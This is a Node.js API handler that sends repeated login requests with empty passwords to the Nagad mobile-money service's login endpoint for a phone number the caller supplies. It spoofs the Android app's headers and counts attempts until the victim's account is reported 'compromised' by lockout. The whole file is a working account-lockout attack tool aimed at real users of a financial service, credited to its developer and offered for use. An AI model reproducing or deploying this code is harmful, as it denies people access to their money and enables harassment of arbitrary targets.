import fetch from 'node-fetch';

let hitMap = new Map(); // Track hit count per number

export default async function handler(req, res) {
  const { number } = req.query;

  if (!number) {
    return res.status(400).json({
      success: false,
      message: 'Please provide a number parameter.',
      credit: 'Developer Tofazzal Hossain for DynamicDevX'
    });
  }

  // Prepare headers and data
  const url = 'https://app2.mynagad.com:20002/api/login';

  const headers = {
    'Host': 'app2.mynagad.com:20002',
    'User-Agent': 'okhttp/3.14.9',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json; charset=UTF-8',
    'X-KM-UserId': '87594060',
    'X-KM-User-MpaId': '17404103407455511125333541230563',
    'X-KM-User-AspId': '100012345612345',
    'X-KM-User-Agent': 'ANDROID/1164',
    'X-KM-Accept-language': 'bn',
    'X-KM-AppCode': '01'
  };

  const body = {
    aspId: '100012345612345',
    mpaId: '',
    password: '',
    username: number
  };

  try {
    const nagadRes = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(body)
    });

    const text = await nagadRes.text();

    // If already locked
    if (text.includes('একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক')) {
      return res.json({
        success: true,
        message: 'Locked Successful! Target is already locked.',
        credit: 'Developer Tofazzal Hossain for DynamicDevX'
      });
    }

    // If invalid number
    if (text.includes('আপনার কোন নগদ অ্যাকাউন্ট নেই')) {
      return res.json({
        success: false,
        message: 'Invalid Nagad number. Please enter a valid number.',
        credit: 'Developer Tofazzal Hossain for DynamicDevX'
      });
    }

    // Track hit count
    const hits = hitMap.get(number) || 0;
    const newHits = hits + 1;
    hitMap.set(number, newHits);

    // After 10 tries, say it's locked
    if (newHits >= 10) {
      return res.json({
        success: true,
        message: 'Locked Successful! Target has been compromised.',
        credit: 'Developer Tofazzal Hossain for DynamicDevX'
      });
    }

    // Otherwise show hit progress
    return res.json({
      success: true,
      message: `Request sent (${newHits}/10)... still trying.`,
      credit: 'Developer Tofazzal Hossain for DynamicDevX'
    });

  } catch (error) {
    return res.status(500).json({
      success: false,
      message: 'Something went wrong!',
      credit: 'Developer Tofazzal Hossain for DynamicDevX'
    });
  }
  }
